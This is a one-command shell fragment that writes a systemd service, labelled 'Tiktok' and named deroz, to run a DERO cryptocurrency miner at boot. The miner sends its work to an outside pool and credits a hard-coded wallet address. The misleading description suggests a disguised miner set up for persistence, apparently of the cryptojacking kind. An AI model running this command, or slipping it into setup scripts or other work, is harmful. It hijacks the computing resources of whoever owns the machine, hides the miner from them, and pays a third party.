...
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/dero_linux_amd64/dero-miner-linux-amd64 --wallet-address deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6vrhm75m8f6tqs8dfaq7 --daemon-rpc-address=community-pools.mysrv.cloud:10300\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
